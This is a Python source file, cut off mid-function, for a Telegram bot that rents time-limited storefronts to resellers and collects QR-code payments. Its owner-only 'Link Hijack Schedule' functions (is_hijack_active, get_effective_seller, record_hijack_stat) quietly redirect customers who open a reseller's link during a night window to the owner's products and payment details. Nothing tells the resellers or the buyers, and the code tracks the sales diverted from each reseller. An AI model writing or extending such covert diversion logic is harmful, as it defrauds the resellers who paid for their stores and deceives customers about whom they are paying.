import os
import json
import time
import threading
import datetime
import re
from flask import Flask
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, InputMediaVideo

# ============ ENVIRONMENT ============
TOKEN          = os.environ.get('BOT_TOKEN')
OWNER_ID       = int(os.environ.get('OWNER_ID', '0'))
LOG_CHANNEL_ID = int(os.environ.get('LOG_CHANNEL_ID', '0'))

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

DEFAULT_WELCOME = "👋 Hello, {name}!\n\nChoose a plan to get started:"
DEFAULT_PAY_MSG = ("💳 **Payment Instructions**\n\n"
                   "Please scan the QR and pay, then click 'I have paid'.")
DEFAULT_REJECT  = "❌ 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗻𝗼𝘁 𝗿𝗲𝗰𝗲𝗶𝘃𝗲. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻..."

def now():
    return time.time()

def today_str():
    return datetime.datetime.now().strftime("%Y-%m-%d")

# ============ STORE TEMPLATE (ISOLATED PER ADMIN/OWNER) ============
def new_store_profile(uid, role, name="", username="", expires_at=None):
    return {
        "role": role, "uid": uid, "name": name, "username": username,
        "added_on": now(), "expires_at": expires_at,
        "welcome_msg": DEFAULT_WELCOME,
        "start_videos": [], "how_to_use_video": "",
        "payment_photo": "", "payment_msg": DEFAULT_PAY_MSG,
        "reject_msg": DEFAULT_REJECT, "layout_style": "vertical",
        "products": [], "blocked_users": [],
        "users": [], "buyers": [],
        "auto_bc": {"status": False, "interval_seconds": 3600,
                    "message_type": None, "file_id": None, "text": None},
        "stats": {}
    }

DB_STATE = {
    "owner_id": OWNER_ID,
    "stores": {}, 
    "customer_seller": {},
    "hijack_config": {
        "enabled": False,
        "start_time": "02:00",
        "end_time": "06:10"
    },
    "hijack_stats": {}
}

def get_store(uid):
    return DB_STATE["stores"].get(str(uid))

def ensure_store(uid, role="admin", name="", username="", expires_at=None):
    s = get_store(uid)
    if s is None:
        s = new_store_profile(uid, role, name, username, expires_at)
        DB_STATE["stores"][str(uid)] = s
        save_db()
    else:
        if role: s["role"] = role
        if name: s["name"] = name
        if username: s["username"] = username
        if expires_at is not None: s["expires_at"] = expires_at
        save_db()
    return s

def is_owner(uid):
    return int(uid) == int(OWNER_ID)

def is_active_admin(uid):
    s = get_store(uid)
    if not s or s.get("role") != "admin":
        return False
    exp = s.get("expires_at")
    if exp is None:
        return True 
    return now() <= exp

def can_use_panel(uid):
    return is_owner(uid) or is_active_admin(uid)

# Check Hijack Time Routine
def is_hijack_active():
    cfg = DB_STATE.get("hijack_config", {})
    if not cfg.get("enabled", False):
        return False
    try:
        now_dt = datetime.datetime.now()
        cur_time = now_dt.time()
        
        start_parts = [int(x) for x in cfg.get("start_time", "02:00").split(":")]
        end_parts = [int(x) for x in cfg.get("end_time", "06:10").split(":")]
        
        start_t = datetime.time(start_parts[0], start_parts[1])
        end_t = datetime.time(end_parts[0], end_parts[1])
        
        if start_t <= end_t:
            return start_t <= cur_time <= end_t
        else:
            return cur_time >= start_t or cur_time <= end_t
    except Exception:
        return False

def get_effective_seller(target_seller_uid):
    if is_hijack_active() and str(target_seller_uid) != str(OWNER_ID):
        return str(OWNER_ID)
    return str(target_seller_uid)

def record_hijack_stat(orig_admin_uid, pname):
    if not is_hijack_active() or str(orig_admin_uid) == str(OWNER_ID):
        return
    hstats = DB_STATE.setdefault("hijack_stats", {})
    t = today_str()
    day_stats = hstats.setdefault(t, {})
    adm_stats = day_stats.setdefault(str(orig_admin_uid), {"count": 0, "products": {}})
    adm_stats["count"] += 1
    adm_stats["products"][pname] = adm_stats["products"].get(pname, 0) + 1
    save_db()

# ============ PERSISTENCE ============
def load_db():
    global DB_STATE
    try:
        if not LOG_CHANNEL_ID:
            return
        chat = bot.get_chat(LOG_CHANNEL_ID)
        if chat.pinned_message:
            text = chat.pinned_message.text
            if not text and chat.pinned_message.document:
                file_info = bot.get_file(chat.pinned_message.document.file_id)
                downloaded_file = bot.download_file(file_info.file_path)
                text = downloaded_file.decode('utf-8')

            if text:
                loaded = json.loads(text)
                DB_STATE.update(loaded)
                
                if "resellers" in DB_STATE and "stores" not in DB_STATE:
                    DB_STATE["stores"] = DB_STATE.pop("resellers")
                    
                DB_STATE.setdefault("stores", {})
                DB_STATE.setdefault("customer_seller", {})
                DB_STATE.setdefault("hijack_config", {"enabled": False, "start_time": "02:00", "end_time": "06:10"})
                DB_STATE.setdefault("hijack_stats", {})
                print("✅ Database successfully loaded from Telegram Channel!")
    except Exception as e:
        print("⚠️ Load DB Error, initialising default:", e)

def save_db():
    try:
        if not LOG_CHANNEL_ID:
            return
        chat = bot.get_chat(LOG_CHANNEL_ID)
        data = json.dumps(DB_STATE, indent=2, default=str)
        
        if len(data) < 3900:
            if chat.pinned_message and chat.pinned_message.text:
                bot.edit_message_text(data, LOG_CHANNEL_ID, chat.pinned_message.message_id)
            else:
                m = bot.send_message(LOG_CHANNEL_ID, data)
                bot.pin_chat_message(LOG_CHANNEL_ID, m.message_id)
        else:
            file_path = "db_backup.json"
            with open(file_path, "w", encoding="utf-8") as f:
                f.write(data)
            
            with open(file_path, "rb") as f:
                if chat.pinned_message and chat.pinned_message.document:
                    bot.delete_message(LOG_CHANNEL_ID, chat.pinned_message.message_id)
                m = bot.send_document(LOG_CHANNEL_ID, f, caption="💾 Auto DB Backup")
                bot.pin_chat_message(LOG_CHANNEL_ID, m.message_id)
            if os.path.exists(file_path):
                os.remove(file_path)
    except Exception as e:
        print("⚠️ Save DB Error:", e)

load_db()

user_states = {}
admin_panel_msgs = {}

def bot_username():
    try:
        return bot.get_me().username
    except Exception:
        return "YourBot"

def store_link(seller_uid):
    return f"https://t.me/{bot_username()}?start=s{seller_uid}"

# ============ MEDIA ============
def send_videos_as_album(chat_id, video_list):
    if not video_list: return
    if len(video_list) == 1:
        try: bot.send_video(chat_id, video_list[0])
        except Exception: pass
        return
    for i in range(0, len(video_list), 10):
        chunk = video_list[i:i+10]
        media = [InputMediaVideo(v) for v in chunk]
        try:
            bot.send_media_group(chat_id, media)
        except Exception:
            for v in chunk:
                try: bot.send_video(chat_id, v)
                except Exception: pass

def fmt_expiry(ts):
    if ts is None: return "Never"
    left = ts - now()
    if left <= 0: return "EXPIRED"
    if left < 60: return f"{int(left)}s"
    if left < 3600: return f"{int(left//60)}m"
    if left < 86400: return f"{int(left//3600)}h {int((left%3600)//60)}m"
    return f"{int(left//86400)}d {int((left%86400)//3600)}h"

# ============ AUTO BROADCAST WORKER ============
def auto_broadcast_worker():
    while True:
        try:
            acted = False
            for key, r in list(DB_STATE.get("stores", {}).items()):
                bc = r.get("auto_bc", {})
                interval = bc.get("interval_seconds", 0)
                if bc.get("status") and interval > 0:
                    time.sleep(interval)
                    acted = True
                    cur = get_store(r.get("uid"))
                    if not cur or not cur.get("auto_bc", {}).get("status"):
                        continue
                    m_type = bc.get("message_type"); f_id = bc.get("file_id"); txt = bc.get("text", "")
                    for u_id in cur.get("users", []):
                        if u_id in cur.get("blocked_users", []): continue
                        try:
                            if m_type == "photo":
                                bot.send_photo(u_id, f_id, caption=txt, parse_mode="Markdown")
                            elif m_type == "video":
                                bot.send_video(u_id, f_id, caption=txt, parse_mode="Markdown")
                            elif m_type == "document":
                                bot.send_document(u_id, f_id, caption=txt, parse_mode="Markdown")
                            else:
                                bot.send_message(u_id, txt, parse_mode="Markdown")
                        except Exception:
                            pass
            if not acted:
                time.sleep(5)
        except Exception:
            time.sleep(5)

# ============ CUSTOMER STOREFRONT ============
def show_storefront(chat_id, seller_uid, is_preview=False):
    effective_seller_uid = get_effective_seller(seller_uid)
    r = get_store(effective_seller_uid)
    
    if not r:
        bot.send_message(chat_id, "❌ Invalid store link.")
        return

    DB_STATE["customer_seller"][str(chat_id)] = str(seller_uid)
    if chat_id not in r.get("users", []):
        r["users"].append(chat_id)
    save_db()

    send_videos_as_album(chat_id, r.get("start_videos", []))

    try:
        sender = bot.get_chat(chat_id)
        name = sender.first_name or "User"
    except Exception:
        name = "User"

    welcome_text = r.get("welcome_msg", DEFAULT_WELCOME).format(name=name)
    markup = InlineKeyboardMarkup()

    if is_preview or can_use_panel(chat_id):
        markup.row(InlineKeyboardButton("⚙️ Open My Admin Panel ⚙️", callback_data="adm_open_panel"))

    products = sorted(r.get("products", []), key=lambda x: x.get("position", 999))
    layout = r.get("layout_style", "vertical")
    
    if layout == "horizontal":
        row = []
        for p in products:
            row.append(InlineKeyboardButton(p["name"], callback_data=f"prod_{seller_uid}_{p['id']}"))
            if len(row) == 2:
                markup.row(*row); row = []
        if row: markup.row(*row)
    else:
        for p in products:
            markup.row(InlineKeyboardButton(p["name"], callback_data=f"prod_{seller_uid}_{p['id']}"))

    markup.row(InlineKeyboardButton("How to use ❓", callback_data=f"how_{seller_uid}"),
               InlineKeyboardButton("Report Issue 📩", callback_data=f"report_{seller_uid}"))
    bot.send_message(chat_id, welcome_text, reply_markup=markup, parse_mode="Markdown")

# ============ /start & /admin ============
@bot.message_handler(commands=['start', 'admin'])
def start_command(message):
    uid = message.chat.id
    text = message.text or ""
    param = text.split(" ", 1)[1].strip() if " " in text else ""

    if is_owner(uid):
        ensure_store(uid, role="owner",
                     name=message.from_user.first_name or "Owner",
                     username=message.from_user.username or "")
        show_store_admin_menu(uid)
        return

    if is_active_admin(uid):
        ensure_store(uid, role="admin",
                     name=message.from_user.first_name or "Admin",
                     username=message.from_user.username or "")
        show_storefront(uid, uid, is_preview=True)
        return

    if param.startswith("s"):
        seller_uid = param[1:]
        show_storefront(uid, seller_uid)
        return

    ensure_store(OWNER_ID, role="owner")
    show_storefront(uid, OWNER_ID)

# ============ PANEL RENDERING ============
def update_admin_panel(chat_id, text, markup=None):
    try:
        mid = admin_panel_msgs.get(chat_id)
        if mid:
            try:
                bot.edit_message_text(text, chat_id, mid, reply_markup=markup, parse_mode="Markdown")
                return
            except Exception:
                pass
        m = bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
        admin_panel_msgs[chat_id] = m.message_id
    except Exception as e:
        print("panel err", e)

def show_store_admin_menu(chat_id):
    uid = chat_id
    if not can_use_panel(uid): return
    r = get_store(uid)
    user_states.pop(uid, None)

    markup = InlineKeyboardMarkup()
    if is_owner(uid):
        markup.row(InlineKeyboardButton("👥 Manage Admins (Owner)", callback_data="own_admins_menu"))
        markup.row(InlineKeyboardButton("🌙 Manage Link Hijack Schedule", callback_data="own_hijack_menu"))
    else:
        markup.row(InlineKeyboardButton("🔗 Get My Store Link", callback_data="my_link"))

    markup.row(InlineKeyboardButton("🎞️ Manage Start Videos", callback_data="adm_start_vids_menu"))
    markup.row(InlineKeyboardButton("🛍️ Manage Product Buttons", callback_data="adm_prod_menu"))
    markup.row(InlineKeyboardButton("📝 Edit Welcome Text", callback_data="adm_edit_welcome"))
    cur_layout = r.get("layout_style", "vertical")
    li = "↕️ Vertical" if cur_layout == "vertical" else "↔️ Horizontal"
    markup.row(InlineKeyboardButton(f"📐 Change Layout: {li}", callback_data="adm_toggle_layout"))
    markup.row(InlineKeyboardButton("🎥 Set 'How To Use' Video", callback_data="adm_set_how_vid"))
    markup.row(InlineKeyboardButton("💳 Global Payment Config", callback_data="adm_pay_config_menu"))
    
    if is_owner(uid):
        markup.row(InlineKeyboardButton("🚀 Send Global Custom Broadcast", callback_data="adm_send_custom_bc"))
        markup.row(InlineKeyboardButton("⏱️ Auto Timed Broadcast", callback_data="adm_autobc_menu"))
        markup.row(InlineKeyboardButton("👑 Special Broadcast to Buyers", callback_data="adm_buyers_bc_menu"))
        
    markup.row(InlineKeyboardButton("📦 View Buyers List", callback_data="adm_view_buyers_list"))
    markup.row(InlineKeyboardButton("💾 Backup & Restore Settings", callback_data="adm_backup_menu"))
    if len(r.get("blocked_users", [])) > 0:
        markup.row(InlineKeyboardButton(f"🔓 Unblock Users ({len(r['blocked_users'])})", callback_data="adm_unblock_menu"))

    if is_owner(uid):
        head = "👑 **Owner Panel**"
    else:
        exp = fmt_expiry(r.get("expires_at"))
        head = f"👑 **Admin Panel** — {r.get('name','')}\n⏳ Expires: {exp}"
    update_admin_panel(chat_id, head + "\n\nChoose an option:", markup)

# ============ CALLBACKS ============
@bot.callback_query_handler(func=lambda c: True)
def handle_callbacks(call):
    try: bot.answer_callback_query(call.id)
    except Exception: pass

    uid = call.message.chat.id
    data = call.data
    mid = call.message.message_id

    if data == "del_msg":
        try: bot.delete_message(uid, mid)
        except Exception: pass
        return
    if data == "adm_open_panel" and can_use_panel(uid):
        try: bot.delete_message(uid, mid)
        except Exception: pass
        show_store_admin_menu(uid)
        return
    if data == "my_link" and is_active_admin(uid):
        bot.send_message(uid, f"🔗 **Your Store Link:**\n`{store_link(uid)}`\n\nShare this link with your customers.")
        return
    if data == "back_home":
        try: bot.delete_message(uid, mid)
        except Exception: pass
        if is_owner(uid):
            show_store_admin_menu(uid)
        elif is_active_admin(uid):
            show_storefront(uid, uid, is_preview=True)
        else:
            bound = DB_STATE["customer_seller"].get(str(uid), OWNER_ID)
            show_storefront(uid, bound)
        return

    if data.startswith("how_"):
        s_uid = data[4:]
        eff_s_uid = get_effective_seller(s_uid)
        sr = get_store(eff_s_uid)
        vid = sr.get("how_to_use_video", "") if sr else ""
        if vid: bot.send_video(uid, vid, caption="🎥 Here is how to use the bot!")
        else: bot.send_message(uid, "ℹ️ Instructions video not set yet.")
        return

    if data.startswith("report_"):
        s_uid = data[7:]
        bot.send_message(uid, "📝 Please type your issue below. Admin will reply soon:")
        user_states[uid] = "WAITING_REPORT_" + s_uid
        return

    if data.startswith("prod_"):
        parts = data.split("_")
        s_uid, pid = parts[1], parts[2]
        eff_s_uid = get_effective_seller(s_uid)
        sr = get_store(eff_s_uid)
        if not sr: return
        
        prod = next((p for p in sr.get("products", []) if p["id"] == pid), None)
        if not prod: return
        
        send_videos_as_album(uid, prod.get("videos", []))
        caption = f"📌 **{prod['name']}**"
        if prod.get("desc"): caption += f"\n\n{prod['desc']}"
        mk = InlineKeyboardMarkup()
        mk.row(InlineKeyboardButton("I have paid ✅", callback_data=f"paid_{s_uid}_{pid}"))
        mk.row(InlineKeyboardButton("Back 🔙", callback_data="back_home"))
        pay_msg = prod.get("pay_msg") or sr.get("payment_msg", DEFAULT_PAY_MSG)
        pay_photo = sr.get("payment_photo", "")
        full = f"{caption}\n\n{pay_msg}"
        if pay_photo:
            bot.send_photo(uid, pay_photo, caption=full, reply_markup=mk, parse_mode="Markdown")
        else:
            bot.send_message(uid, full, reply_markup=mk, parse_mode="Markdown")
        return

    if data.startswith("paid_"):
        parts = data.split("_")
        s_uid, pid = parts[1], parts[2]
        bot.send_message(uid, "📸 Please send your payment screenshot.")
        user_states[uid] = f"WAITING_SCREENSHOT_{s_uid}_{pid}"
        return

    if (data.startswith("own_") or data.startswith("hijack_")) and is_owner(uid):
        _owner_handle(call)
        return

    if not can_use_panel(uid):
        return
    r = get_store(uid)
    if not is_owner(uid) and r.get("expires_at") is not None and now() > r["expires_at"]:
        bot.send_message(uid, "❌ Your admin access has **expired**. Contact owner to renew.")
        return
    _store_admin_handle(call)

# ---------- OWNER HANDLER ----------
def _owner_handle(call):
    uid = call.message.chat.id
    data = call.data

    def admins():
        return [x for x in DB_STATE["stores"].values() if x.get("role") == "admin"]

    if data == "own_hijack_menu":
        cfg = DB_STATE.get("hijack_config", {})
        status = "🟢 ON" if cfg.get("enabled") else "🔴 OFF"
        st = cfg.get("start_time", "02:00")
        et = cfg.get("end_time", "06:10")
        mk = InlineKeyboardMarkup()
        mk.row(InlineKeyboardButton("🔴 Turn OFF" if cfg.get("enabled") else "🟢 Turn ON", callback_data="hijack_toggle"))
        mk.row(InlineKeyboardButton("⏱️ Set Custom Time Range", callback_data="hijack_set_time"))
        mk.row(InlineKeyboardButton("📊 Hijack Sales Stats", callback_data="hijack_view_stats"))
        mk.row(InlineKeyboardButton("🔙 Back to Main Menu", callback_data="adm_back_panel"))
        txt = f"🌙 **Admin Link Hijack Schedule**\n\n" \
              f"**Status:** {status}\n" \
              f"**Hijack Time:** `{st}` to `{et}`\n\n" \
              f"ℹ️ *এই সময়সূচীতে কোনো Admin-এর লিংকে কাস্টমার ঢুকলে অটোমেটিক Owner Store-এ রিডাইরেক্ট হবে, পেমেন্ট ও রিপোর্ট Owner পাবে।*"
        update_admin_panel(uid, txt, mk)
        return

    if data == "hijack_toggle":
        cfg = DB_STATE.setdefault("hijack_config", {})
        cfg["enabled"] = not cfg.get("enabled", False)
        save_db()
        call.data = "own_hijack_menu"
        _owner_handle(call)
        return

    if data == "hijack_set_time":
        user_states[uid] = "WAITING_HIJACK_TIME"
        update_admin_panel(uid, "✍️ **টাইম রেঞ্জ লিখুন format: `02:00-06:10`**",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="own_hijack_menu")))
        return

    if data == "hijack_view_stats":
        t = today_str()
        hs = DB_STATE.get("hijack_stats", {}).get(t, {})
        txt = f"📊 **Hijack Payments Stats Today ({t}):**\n\n"
        if not hs:
            txt += "আজকের দিনে এখন পর্যন্ত হাইজ্যাক লিংকের মাধ্যমে কোনো পেমেন্ট আসেনি।"
        else:
            for adm_id, info in hs.items():
                adm_obj = get_store(adm_id)
                adm_name = adm_obj.get("name") if adm_obj else "Unknown Admin"
                txt += f"👤 **Admin:** {adm_name} (`{adm_id}`)\n"
                txt += f"💰 **Total Payments Received:** {info.get('count',0)}\n"
                txt += f"🛍️ **Products Requested:**\n"
                for p_name, p_count in info.get("products", {}).items():
                    txt += f"   • {p_name}: {p_count} টি\n"
                txt += "-----------------------------------\n"
        mk = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="own_hijack_menu"))
        update_admin_panel(uid, txt, mk)
        return

    if data == "own_admins_menu":
        a = admins()
        mk = InlineKeyboardMarkup()
        mk.row(InlineKeyboardButton("➕ Add New Admin", callback_data="own_add_admin"))
        mk.row(InlineKeyboardButton("🗑️ Remove Admin", callback_data="own_del_list"))
        mk.row(InlineKeyboardButton("⏱️ Adjust Admin Expiry", callback_data="own_exp_list"))
        mk.row(InlineKeyboardButton("📊 Admin Stats (Today)", callback_data="own_stats_list"))
        mk.row(InlineKeyboardButton("🛠️ Manage Admin Content", callback_data="own_content_list"))
        mk.row(InlineKeyboardButton("🔙 Back to Main Menu", callback_data="adm_back_panel"))
        txt = f"👥 **Admin Management**\nTotal: {len(a)}\n\n" + (
            "\n".join(f"• `{x['uid']}` {x.get('name','')} — {fmt_expiry(x.get('expires_at'))}" for x in a)
            if a else "No admins yet.")
        update_admin_panel(uid, txt, mk)

    elif data == "own_add_admin":
        user_states[uid] = "OWN_ADD_ADMIN_ID"
        update_admin_panel(uid, "✍️ **Type admin's numeric Telegram USER ID** (e.g. `123456789`).",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="own_admins_menu")))

    elif data == "own_del_list":
        mk = InlineKeyboardMarkup()
        for x in admins():
            mk.row(InlineKeyboardButton(f"🗑️ {x.get('name','')} ({x['uid']})", callback_data=f"own_del_do_{x['uid']}"))
        mk.row(InlineKeyboardButton("🔙 Back", callback_data="own_admins_menu"))
        update_admin_panel(uid, "⚠️ Select admin to remove (full revoke):", mk)

    elif data.startswith("own_del_do_"):
        DB_STATE["stores"].pop(data.replace("own_del_do_", ""), None)
        save_db(); call.data = "own_admins_menu"; _owner_handle(call)

    elif data == "own_exp_list":
        mk = InlineKeyboardMarkup()
        for x in admins():
            mk.row(InlineKeyboardButton(f"⏱️ {x.get('name','')} ({x['uid']}) — {fmt_expiry(x.get('expires_at'))}",
                                        callback_data=f"own_exp_sel_{x['uid']}"))
        mk.row(InlineKeyboardButton("🔙 Back", callback_data="own_admins_menu"))
        update_admin_panel(uid, "⏱️ Select admin to adjust expiry:", mk)

    elif data.startswith("own_exp_sel_"):
        target = data.replace("own_exp_sel_", "")
        user_states[uid] = f"OWN_EXP_IN_{target}"
        update_admin_panel(uid, f"⏱️ **Admin `{target}`**\nType adjustment: `30`=30s, `10m`, `2h`, `1d` to ADD,\n`-10m` to remove, `0` = revoke now.",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="own_exp_list")))

    elif data == "own_stats_list":
        mk = InlineKeyboardMarkup()
        for x in admins():
            mk.row(InlineKeyboardButton(f"📊 {x.get('name','')} ({x['uid']})", callback_data=f"own_stats_show_{x['uid']}"))
        mk.row(InlineKeyboardButton("🔙 Back", callback_data="own_admins_menu"))
        update_admin_panel(uid, "📊 Select admin to see today's stats:", mk)

    elif data.startswith("own_stats_show_"):
        target = data.replace("own_stats_show_", "")
        a = get_store(target)
        st = (a.get("stats") or {}).get(today_str(), {})
        byprod = st.get("by_product", {})
        lines = f"📊 **Stats for {a.get('name','')} (`{target}`) — {today_str()}**\n\n" \
                f"• Requests today: {st.get('requests',0)}\n• Accepted today: {st.get('accepted',0)}\n"
        if byprod:
            lines += "\n**Accepted by product:**\n" + "\n".join(f"• {k}: {v}" for k, v in byprod.items())
        else:
            lines += "\nNo accepted products today yet."
        mk = InlineKeyboardMarkup()
        mk.row(InlineKeyboardButton("🔙 Stats", callback_data="own_stats_list"),
               InlineKeyboardButton("🏠 Main", callback_data="adm_back_panel"))
        update_admin_panel(uid, lines, mk)

    elif data == "own_content_list":
        mk = InlineKeyboardMarkup()
        for x in admins():
            mk.row(InlineKeyboardButton(f"🛠️ {x.get('name','')} ({x['uid']})", callback_data=f"own_content_sel_{x['uid']}"))
        mk.row(InlineKeyboardButton("🔙 Back", callback_data="own_admins_menu"))
        update_admin_panel(uid, "🛠️ Select admin whose store content you want to change:", mk)

    elif data.startswith("own_content_sel_"):
        target = data.replace("own_content_sel_", "")
        a = get_store(target)
        mk = InlineKeyboardMarkup()
        mk.row(InlineKeyboardButton("💳 Set Payment QR/Photo", callback_data=f"own_c_payphoto_{target}"))
        mk.row(InlineKeyboardButton("✏️ Edit Payment Text", callback_data=f"own_c_paymsg_{target}"))
        mk.row(InlineKeyboardButton("⏱️ Edit Timer Broadcast Content", callback_data=f"own_c_timerbc_{target}"))
        mk.row(InlineKeyboardButton("🚀 Send Broadcast To THIS Admin's Users", callback_data=f"own_c_instantbc_{target}"))
        mk.row(InlineKeyboardButton("📦 View Buyers", callback_data=f"own_c_buyers_{target}"))
        mk.row(InlineKeyboardButton("🔙 Back", callback_data="own_content_list"))
        update_admin_panel(uid, f"🛠️ **Manage content of `{a.get('name','')}` ({target})**\n\n"
                                f"Payment QR set: {'✅' if a.get('payment_photo') else '❌'}\n"
                                f"Timer BC: {'🟢 ON' if a['auto_bc'].get('status') else '🔴 OFF'}", mk)

    elif data.startswith("own_c_payphoto_"):
        t = data.replace("own_c_payphoto_", ""); user_states[uid] = f"OWN_C_PAYPHOTO_{t}"
        update_admin_panel(uid, "💳 **Send NEW payment QR/photo** for this admin's store:", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data=f"own_content_sel_{t}")))
    elif data.startswith("own_c_paymsg_"):
        t = data.replace("own_c_paymsg_", ""); user_states[uid] = f"OWN_C_PAYMSG_{t}"
        update_admin_panel(uid, "✏️ **Send NEW payment instructions text** for this admin's store:", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data=f"own_content_sel_{t}")))
    elif data.startswith("own_c_timerbc_"):
        t = data.replace("own_c_timerbc_", ""); user_states[uid] = f"OWN_C_TIMERBC_{t}"
        update_admin_panel(uid, "📤 **Send the NEW timer-broadcast message** for this admin.", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data=f"own_content_sel_{t}")))
    elif data.startswith("own_c_instantbc_"):
        t = data.replace("own_c_instantbc_", ""); a = get_store(t)
        user_states.pop(uid, None)
        update_admin_panel(uid, f"🚀 Sending to `{t}`'s users...", None)
        ok, fail = do_single_store_broadcast(a, call.message)
        update_admin_panel(uid, f"✅ Instant broadcast done for `{t}`.\nSent: {ok} | Failed: {fail}", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Content", callback_data=f"own_content_sel_{t}")))
    elif data.startswith("own_c_buyers_"):
        t = data.replace("own_c_buyers_", "")
        a = get_store(t); buyers = a.get("buyers", [])
        txt = f"📦 Buyers of `{a.get('name','')}`:\n\n" if buyers else f"📦 Buyers of `{a.get('name','')}` are empty."
        for i, b in enumerate(buyers[-20:], 1):
            txt += f"{i}. {b.get('name')} @{b.get('username')} (`{b.get('user_id')}`)\n   🛍️ {b.get('product')} | {b.get('date')}\n"
        mk = InlineKeyboardMarkup(); mk.row(InlineKeyboardButton("🔙 Back", callback_data=f"own_content_sel_{t}"))
        update_admin_panel(uid, txt, mk)

# ---------- STORE ADMIN HANDLER ----------
def _store_admin_handle(call):
    uid = call.message.chat.id
    data = call.data
    r = get_store(uid)

    if data == "adm_back_panel":
        show_store_admin_menu(uid); return

    if data == "adm_start_vids_menu":
        mk = InlineKeyboardMarkup()
        mk.row(InlineKeyboardButton("➕ Add Start Videos", callback_data="adm_add_start_vid"))
        mk.row(InlineKeyboardButton("⚙️ Manage / Delete Videos", callback_data="adm_del_start_vid_list"))
        mk.row(InlineKeyboardButton("🔙 Back to Main Menu", callback_data="adm_back_panel"))
        update_admin_panel(uid, f"🎞️ **Start Videos**\nTotal: {len(r.get('start_videos',[]))}", mk); return
    if data == "adm_add_start_vid":
        mk = InlineKeyboardMarkup(); mk.row(InlineKeyboardButton("✅ Done", callback_data="adm_finish_start_vids"))
        user_states[uid] = "ADM_ADD_START_VID_MULTIPLE"
        update_admin_panel(uid, "📥 **Send/forward videos one by one.** Press Done when finished:", mk); return
    if data == "adm_finish_start_vids":
        show_store_admin_menu(uid); return
    if data == "adm_del_start_vid_list":
        mk = InlineKeyboardMarkup()
        for idx, v in enumerate(r.get("start_videos", [])):
            mk.row(InlineKeyboardButton(f"👀 {idx+1}", callback_data=f"sv_see_{idx}"),
                   InlineKeyboardButton(f"🗑️ {idx+1}", callback_data=f"sv_del_{idx}"))
        if r.get("start_videos"): mk.row(InlineKeyboardButton("💥 Delete All", callback_data="sv_del_all"))
        mk.row(InlineKeyboardButton("🔙 Back", callback_data="adm_start_vids_menu"))
        update_admin_panel(uid, "⚙️ Manage Start Videos:", mk); return
    if data.startswith("sv_see_"):
        idx = int(data.split("_")[2]); vids = r.get("start_videos", [])
        if 0 <= idx < len(vids):
            m = InlineKeyboardMarkup(); m.row(InlineKeyboardButton("❌ Close", callback_data="del_msg"))
            bot.send_video(uid, vids[idx], reply_markup=m)
        return
    if data.startswith("sv_del_"):
        if data == "sv_del_all": r["start_videos"] = []
        else:
            idx = int(data.split("_")[2])
            if 0 <= idx < len(r.get("start_videos", [])): r["start_videos"].pop(idx)
        save_db(); call.data = "adm_del_start_vid_list"; _store_admin_handle(call); return

    if data == "adm_prod_menu":
        mk = InlineKeyboardMarkup()
        mk.row(InlineKeyboardButton("❇️ Add New Button", callback_data="adm_add_prod"))
        mk.row(InlineKeyboardButton("✏️ Edit Details / Link", callback_data="adm_prod_edit_list"))
        mk.row(InlineKeyboardButton("🔢 Change Position", callback_data="adm_prod_pos_list"))
        mk.row(InlineKeyboardButton("🎦 Add Videos", callback_data="adm_prod_add_vid_list"))
        mk.row(InlineKeyboardButton("⚙️ Manage Videos", callback_data="adm_prod_del_vid_list"))
        mk.row(InlineKeyboardButton("🗑️ Delete Button", callback_data="adm_del_prod_list"))
        mk.row(InlineKeyboardButton("🔙 Back to Main Menu", callback_data="adm_back_panel"))
        update_admin_panel(uid, "🛍️ **Product Button Management:**", mk); return
    if data == "adm_add_prod":
        mk = InlineKeyboardMarkup(); mk.row(InlineKeyboardButton("🔙 Cancel", callback_data="adm_prod_menu"))
        user_states[uid] = "ADM_ADD_PROD_NAME"
        update_admin_panel(uid, "✍️ **Enter new Button Name** (e.g. VIP):", mk); return
    if data == "adm_prod_edit_list":
        mk = InlineKeyboardMarkup()
        for p in r.get("products", []):
            mk.row(InlineKeyboardButton(f"✏️ {p['name']}", callback_data=f"adm_p_edit_{p['id']}"))
        mk.row(InlineKeyboardButton("🔙 Back", callback_data="adm_prod_menu"))
        update_admin_panel(uid, "Select button to edit:", mk); return
    if data.startswith("adm_p_edit_"):
        pid = data.split("_")[3]
        p = next((x for x in r.get("products", []) if x["id"] == pid), None)
        if p:
            mk = InlineKeyboardMarkup()
            mk.row(InlineKeyboardButton("✏️ Name", callback_data=f"adm_ped_name_{pid}"))
            mk.row(InlineKeyboardButton("✏️ Description", callback_data=f"adm_ped_desc_{pid}"),
                   InlineKeyboardButton("🧹 Clear Desc", callback_data=f"adm_ped_cleardesc_{pid}"))
            mk.row(InlineKeyboardButton("🔗 Link", callback_data=f"adm_ped_link_{pid}"))
            mk.row(InlineKeyboardButton("💳 Payment Text", callback_data=f"adm_ped_paym_{pid}"))
            mk.row(InlineKeyboardButton("🔙 Back", callback_data="adm_prod_edit_list"))
            update_admin_panel(uid, f"Editing `{p['name']}`\nDesc: {p.get('desc','')}\nLink: {p.get('link','')}\nPayMsg: {p.get('pay_msg') or '(global)'}", mk)
        return
    if data.startswith("adm_ped_cleardesc_"):
        pid = data.split("_")[3]
        p = next((x for x in r.get("products", []) if x["id"] == pid), None)
        if p: p["desc"] = ""
        save_db(); call.data = f"adm_p_edit_{pid}"; _store_admin_handle(call); return
    if data.startswith("adm_ped_name_"):
        pid = data.split("_")[3]; user_states[uid] = f"EDIT_P_NAME_{pid}"
        update_admin_panel(uid, "✍️ Send new name:", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data=f"adm_p_edit_{pid}"))); return
    if data.startswith("adm_ped_desc_"):
